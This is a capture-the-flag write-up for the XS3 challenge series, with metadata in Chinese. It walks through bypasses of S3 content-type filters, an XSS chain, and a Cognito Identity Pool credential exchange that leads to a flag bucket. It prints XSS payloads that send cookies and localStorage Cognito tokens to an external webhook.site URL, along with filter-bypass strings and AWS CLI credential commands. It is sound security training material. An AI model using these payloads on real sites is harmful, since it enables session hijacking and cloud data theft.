---
title: XS3 Writeup (AWS Cognito + S3 + Web 攻击链)
contest: Ricotecki CTF (XS3)
year: 2024
difficulty: hard
vuln_type: xss
tags:
- s3_presigned_url
- content_type_filter_bypass
- xss_cookie_steal
- cognito_id_token
- aws_get_credentials_for_identity
- s3_special_flag_bucket
- s3_sync_download
- js_blob_url_xss
- content_type_toLowerCase_trim
- deny_mime_subtypes
attack_chain: 1) S3 预签名 URL + createPresignedPost content-length-range 0-100MB + starts-with $Content-Type 'image' + 内置 denyMimeSubTypes 过滤 html/javascript/xml/json/svg/xhtml/xsl / 2) bypass:contentType text/html;x=image/png → endsWith('image/png') 命中但 S3 仍存储 text/html / 3) 注入 XSS:window.parent.document.cookie 跨域读 parent / 4) Cognito IdentityPool 凭据链:get-id → get-credentials-for-identity → 临时 AccessKeyId/SecretKey/SessionToken → aws s3 ls → specialflagbucket-5250c0a74f-adv3-special-flag → s3 sync 下载 flag.txt
key_payload: '{"contentType":"text/html;x=image/png"} / 17 关渐进式 contentType 过滤 / aws cognito-identity get-id --identity-pool-id ap-northeast-1:05611045-eb46-41e2-9f6c-f41d87547e4d --logins {ISS}={IDTOKEN}'
one_liner: XS3 (ricotecki) 17 关 S3 contentType 过滤 bypass + Cognito Identity Pool 临时凭据 + s3 sync 拉 specialflagbucket 完整攻击链，覆盖 endsWith/startsWith/includes/RegExp/数组等多种过滤。
lesson: S3 starts-with $Content-Type 'image' 是早期常见过滤漏洞，可通过 ;parameter 注入绕过；Cognito Identity Pool 是 AWS 临时凭据颁发的低门槛入口。
quality: high
full_path: XS3_Writeup.full.md
meta_path: XS3_Writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: XS3 Writeup (AWS Cognito + S3 + Web 攻击链)。XS3 (ricotecki) 17 关 S3 contentType 过滤 bypass + Cognito Identity Pool 临时凭据 + s3 sync 拉 specialflagbucket 完整攻击链，覆盖 endsWith/startsWith/includes/RegExp/数组等多种过...
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/172054.html
reasoning_chain:
- 触发点:17 关 progressive contentType 过滤,starts-with $Content-Type 'image' + 内置 denyMimeSubTypes(html/javascript/xml/json/svg/xhtml/xsl) → 假设:可 bypass
- 动作:先尝试 text/html;charset=utf-8 → 观察:被 denyMimeSubTypes 拒绝 → 下一步:试 endsWith 截断
- '动作:contentType: ''text/html;x=image/png'' → 观察:endsWith(''image/png'') 命中 starts-with 但 S3 仍存 text/html → 命中第 17 关'
- 触发点:第 17 关成功后注入 XSS → 动作:window.parent.document.cookie 跨域读 parent → 观察:能读父 cookie
- 触发点:拿到 cookie 后下一步拿 Cognito 凭据 → 动作:aws cognito-identity get-id --identity-pool-id ap-northeast-1:05611045 → 观察:得到 IdentityId
- 动作:aws cognito-identity get-credentials-for-identity --identity-id X --logins {ISS}={IDTOKEN} → 观察:得到临时 AccessKeyId/SecretKey/SessionToken
- 动作:aws s3 ls + aws s3 sync s3://specialflagbucket-5250c0a74f-adv3-special-flag → 观察:下载 flag.txt → 完成
failed_attempts:
- 试图用 text/html 直接灌 → 失败:被 denyMimeSubTypes 拒绝
- 试图用 array 绕过 endsWith → 失败:endsWith 走 toString() 不会触发 array hack
- 试图只靠 createPresignedPost 上传 → 失败:上传完没有触发 XSS 的下半场
key_observations:
- S3 starts-with $Content-Type 'image' 是早期常见过滤漏洞,可 ;parameter 注入绕过
- Cognito Identity Pool 是 AWS 临时凭据颁发的低门槛入口,拿到 ID Token 就能换 AccessKey
- S3 sync 比 s3 cp 一次拉整 bucket 更省事
- toLowerCase().trim() 弱过滤配合 endsWith 是经典 Node.js Web 漏洞模式
- denyMimeSubTypes 这种 deny-list 总能被 ;parameter + endsWith 截断绕过
prerequisites:
- AWS S3 createPresignedPost 上传流程
- Cognito Identity Pool + get-credentials-for-identity 凭据链
- AWS CLI (aws s3 / aws cognito-identity)
- Node.js Web 字符串过滤 bypass 技巧
---
# XS3 Writeup

> 原文: https://www.ctfiot.com/172054.html
> ID: 172054


```
flag{welcome_2_xs3}
<html>
 
 <script>
 const c = btoa(document.cookie);
 fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+c);
 </script>
 
</html>
flag{bfe061955a7cf19b12ff0f224e88d65a470e800a}
Failed to get presigned URL
{"contentType":"text/html","length":
186}
const allow = ['image/png', 'image/jpeg', 'image/gif'];
 if (!allow.includes(request.body.contentType)) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }
{"contentType":"image/png","length":
186}
flag{fc6f76dd4368e888c1bc878b7750b374c891639f}
Invalid file type
const filename = uuidv4();
 const s3 = new S3Client({});
 const { url, fields } = await createPresignedPost(s3, {
 Bucket: process.env.BUCKET_NAME!,
 Key: `upload/${filename}`,
 Conditions: [
 ['content-length-range', 0, 1024 * 1024 * 100],
 ['starts-with', '$Content-Type', 'image'],
 ],
 Fields: {
 'Content-Type': request.body.contentType,
 },
 Expires: 600,
 });
 return reply.header('content-type', 'application/json').send({
 url,
 fields,
 });
{"contentType":"imageaaaa","length":
186}
flag{c137e5b9b7afd4b13a15839a26153940beeefc7d}
const contentTypeValidator = (contentType: string) => {
 if (contentType.endsWith('image/png')) return true;
 if (contentType.endsWith('image/jpeg')) return true;
 if (contentType.endsWith('image/jpg')) return true;
 return false;
 };

 if (!contentTypeValidator(request.body.contentType)) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }
text/html;x=image/png
flag{97ce55c30c8dc3a34cd73bbf3f49c2bb15a89617}
if (request.body.contentType.includes(';')) {
 return reply.code(400).send({ error: 'No file type (only type/subtype)' });
 }

 const allow = new RegExp('image/(jpg|jpeg|png|gif)$');
 if (!allow.test(request.body.contentType)) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }
text/html image/png
flag{acc9b4786f6bf003a75f32b5607c92530dcf6b9f}
const allowContentTypes = ['image/png', 'image/jpeg', 'image/jpg'];

 const isAllowContentType = allowContentTypes.filter((contentType) => request.body.contentType.startsWith(contentType) && request.body.contentType.endsWith(contentType));
 if (isAllowContentType.length === 0) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }
image/jpg,text/html;charset=UTF-8,text/html;charset=image/jpg
flag{f9eedd5f8b508ff8b03b803affb00d381826047b}
const denyStringRegex = /[\s\;()]/;

 if (denyStringRegex.test(request.body.extention)) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }

 const allowExtention = ['png', 'jpeg', 'jpg', 'gif'];

 const isAllowExtention = allowExtention.filter((ext) => request.body.extention.includes(ext)).length > 0;
 if (!isAllowExtention) {
 return reply.code(400).send({ error: 'Invalid file extention' });
 }
{
 "extention": "png,text/html"
 "length": 186
}
image/aaaa,text/html,bbbb,png
flag{b1b3fcx5f8b508ff8b03b803affb00d381826047b}
{
 "extention": [
 "png",
 "text/html"
 ],
 "length": 186
}
const denyStrings = new RegExp('[;,="\'()]');

 if (denyStrings.test(request.body.contentType)) {
 return reply.code(400).send({ error: 'Invalid content type' });
 }

 if (!request.body.contentType.startsWith('image') || !['jpeg', 'jpg', 'png', 'gif'].includes(request.body.contentType.split('/')[1])) {
 return reply.code(400).send({ error: 'Invalid image type' });
 }
const command = new PutObjectCommand({
 Bucket: process.env.BUCKET_NAME,
 Key: `upload/${filename}`,
 ContentType: `${request.body.contentType.split('/')[0]}/${request.body.contentType.split('/')[1]}`,
 });
image text%2fhtml test/png
flag{c4ca4238a0b923820dcc509a6f75849b}
await page.evaluate(
 (IdToken: string, AccessToken: string, RefreshToken: string) => {
 const randomNumber = Math.floor(Math.random() * 1000000);
 localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.idToken`, IdToken);
 localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.accessToken`, AccessToken);
 localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.refreshToken`, RefreshToken);
 },
 IdToken,
 AccessToken,
 RefreshToken,
 );
const [contentType, ...params] = request.body.contentType.split(';');
 const type = contentType.split('/')[0].toLowerCase();
 const subtype = contentType.split('/')[1].toLowerCase();

 const denyMimeSubTypes = ['html', 'javascript', 'xml', 'json', 'svg', 'xhtml', 'xsl'];
 if (denyMimeSubTypes.includes(subtype)) {
 return reply.code(400).send({ error: 'Invalid file type' });
 }
 const denyStrings = new RegExp('[;,="\'()]');
 if (denyStrings.test(type) || denyStrings.test(subtype)) {
 return reply.code(400).send({ error: 'Invalid Type or SubType' });
 }
text%2fhtml / image%2fpng
const url = await getSignedUrl(s3, command, {
 expiresIn: 60 * 60 * 24,
 signableHeaders: new Set(['content-type']),
 });
<html>
 
 <script>
 let cred = "";
 Object.keys(localStorage).forEach(k => {
 cred += `${k}:${localStorage[k]},`
 })
 fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+cred);
 </script>
 
</html>
flag{c81e728d9d4c2f636f067f89cc14862c}
const url = await getSignedUrl(s3, command, {
 expiresIn: 60 * 60 * 24,
 signableHeaders: new Set(['content-type', 'content-disposition']),
 });
~~~~~~~~~
const command = new PutObjectCommand({
 Bucket: process.env.BUCKET_NAME,
 Key: `upload/${filename}`,
 ContentLength: request.body.length,
 ContentType: request.body.contentType,
 ContentDisposition: 'attachment',
 });
text/html aaaa
const denyMimeSubTypes = ['html', 'javascript', 'xml', 'json', 'svg', 'xhtml', 'xsl'];

 const extractMimeType = (contentTypeAndParams) => {
 const [contentType, ...params] = contentTypeAndParams.split(';');
 console.log(`Extracting content type: ${contentType}`);
 console.log(`Extracting params: ${JSON.stringify(params)}`);
 const [type, subtype] = contentType.split('/');
 console.log(`Extracting type: ${type}`);
 console.log(`Extracting subtype: ${subtype}`);
 return { type, subtype, params };
 };

 const isDenyMimeSubType = (contentType) => {
 console.log(`Checking content type: ${contentType}`);
 const { subtype } = extractMimeType(contentType);
 return denyMimeSubTypes.includes(subtype.trim().toLowerCase());
 };

 window.onload = async () => {
 const url = new URL(window.location.href);
 const path = url.pathname.slice(1).split('/');
 path.shift();
 const key = path.join('/');
 console.log(`Loading file: /${key}`);

 const response = await fetch(`/${key}`);
 if (!response.ok) {
 console.error(`Failed to load file: /${key}`);
 document.body.innerHTML = '<h1>Failed to load file</h1>';
 return;
 }
 const contentType = response.headers.get('content-type');
 if (isDenyMimeSubType(contentType)) {
 console.error(`Failed to load file: /${key}`);
 document.body.innerHTML = '<h1>Failed to load file due to invalid content type</h1>';
 return;
 }
 const blobUrl = URL.createObjectURL(await response.blob());
 document.body.innerHTML = ``;
 };
<html>
 
 <script>
 const c = btoa(window.parent.document.cookie);
 fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+c);
 </script>
 
</html>
flag{d41d8cd98f00b204e9800998ecf8427e}
aws cognito-identity get-id \
 --identity-pool-id ap-northeast-1:
05611045-eb46-41e2-9f6c-f41d87547e4d \
 --logins {ISS}={IDTOKEN} \
 --query "IdentityId"

"ap-northeast-1:
4f187980-dcb4-c060-4a49-b1d4128a0d3d"
aws cognito-identity get-credentials-for-identity \
 --identity-id ap-northeast-1:
4f187980-dcb4-c060-4a49-b1d4128a0d3d \
 --logins {ISS}={IDTOKEN}
{
 "IdentityId": "ap-northeast-1:
4f187980-dcb4-c060-4a49-b1d4128a0d3d",
 "Credentials": {
 "AccessKeyId": "REDACTED",
 "SecretKey": "REDACTED",
 "SessionToken": "REDACTED",
 "Expiration": "2024-04-03T09:29:10+09:00"
 }
}
export AWS_ACCESS_KEY_ID=REDACTED
export AWS_SECRET_ACCESS_KEY=REDACTED
export AWS_SECURITY_TOKEN="REDACTED"
aws s3 ls

2024-03-24 19:01:16 cdk-hnb659fds-assets-339713032412-ap-northeast-1
2024-03-24 22:36:30 deliverybucket-5250c0a74f-adv-3-delivery
2024-03-25 14:05:29 specialflagbucket-5250c0a74f-adv3-special-flag
2024-03-24 22:36:30 uploadbucket-5250c0a74f-adv-3-upload
aws s3 sync s3://specialflagbucket-5250c0a74f-adv3-special-flag ./flag.txt

download: s3://specialflagbucket-5250c0a74f-adv3-special-flag/flag.txt to flag.txt/flag.txt
flag{eccbc87e4b5ce2fe28308fd9f2a7baf3}
```
